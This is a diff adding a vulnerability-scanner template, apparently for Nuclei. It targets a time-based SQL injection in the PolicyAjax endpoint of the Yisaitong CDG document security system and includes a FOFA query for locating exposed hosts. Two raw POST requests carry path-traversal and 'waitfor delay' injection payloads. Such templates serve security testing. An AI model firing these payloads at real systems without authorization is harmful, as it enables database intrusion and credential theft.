@@ -1,0 +1,43 @@
+id: yisaitong-CDG-PolicyAjax-sql
+
+info:
+  name: "亿赛通电子文档安全管理系统 PolicyAjax 接口 SQL 注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/CDGServer3/index.jsp"
+    亿赛通电子文档安全管理系统在 PolicyAjax 接口的 SQL 查询处理逻辑中存在注入缺陷，攻击者可通过构造恶意输入执行任意 SQL 查询。该漏洞可能导致数据库敏感信息泄露（包括但不限于管理员账户凭证、用户隐私数据等），在特定权限条件下，攻击者可进一步利用该缺陷在服务器存储路径写入远程代码载荷，实现对目标系统的未授权访问控制。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/141030113
+  tags: 亿赛通
+
+
+http:
+- raw:
+  - |
+    POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    command=selectOption&id=1';waitfor+delay+'0:0:4'--
+
+  - |
+    POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    command=selectOption&id=1';waitfor+delay+'0:0:8'--
+
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
